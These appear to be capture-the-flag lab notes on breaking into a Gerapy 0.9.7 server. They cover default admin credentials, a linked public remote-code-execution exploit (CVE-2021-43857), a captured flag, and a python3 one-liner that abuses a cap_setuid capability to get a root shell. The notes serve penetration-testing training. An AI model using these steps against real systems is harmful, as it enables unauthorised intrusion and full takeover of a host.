My IP: 192.168.45.211
Target IP: 192.168.108.24

nmap:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Port 22: 
- If we get creds we can abuse this!

Port 8000: 
- We see that this is a web page running on python version 3.10.6 (may or may not be useful), nevertheless lets do some enumeration to see what we see on the web page. 
![[Pasted image 20260707220909.png]]
- We find a login page - admin admin ends up working for us.
	- We find three tabs. Clients, Projects, and Tasks. For each of these as admin we can create or add to it. 
- We find under the projects tab we can create, and do an upload. I will run gobuster to see if we can find a directory for this
	- Found nothing other than admin. No uploads directory. 
- Towards the bottom of the webpage we find another version number `Gerapy v0.9.7`. This seems more convincing than the python one we found earlier. I will use this to see if we can find any exploits. 
	- Was able to find this [Exploit-DB page ](https://www.exploit-db.com/exploits/50640) (CVE-2021-43857) and this [Github page ](https://github.com/terribledactyl/Gerapy_RCE_0.9.7)
- The exploit works! I ended up using the github one just because in the read me it mentions , `Exploit works by logging in to application, then getting the list of created projects - it will fail if there's none, but thanks to newly created error handling, it will also be more verbose :)`  , and i did indeed have to create a project. 
- First flag: 7a629a7f3ac5dba986ad2f9ccd47a146



![[Pasted image 20260707221014.png]]I exhausted all of my linux priv esc techniques so I resulted to Linpeas. 
What stands out:
```
**Files with capabilities (limited to 50):
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/snap/core20/1891/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/python3.10 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep

╔══════════╣ Users with capabilities (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities

╚ Checking if PAM loads pam_cap.so
/etc/pam.d/common-auth:25:auth	optional			pam_cap.so 

**
```

The capset uid stands out. We can see the end of the file path is python3.10 but we can searching for python related exploits on [GTFObins](https://gtfobins.org/gtfobins/python/).  
The command that worked. 
```
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

